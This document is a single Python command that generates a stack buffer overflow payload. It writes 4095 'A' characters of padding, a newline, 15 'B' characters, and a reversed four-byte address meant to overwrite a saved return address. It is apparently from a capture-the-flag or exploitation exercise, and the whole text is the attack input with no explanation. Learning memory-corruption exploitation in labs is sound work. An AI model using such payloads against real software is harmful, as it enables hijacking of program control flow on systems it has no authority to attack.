python -c "print('A' * 4095 + '\n' + 'B' * 15 + '\xbf\xff\xf8\x4a'[::-1])"
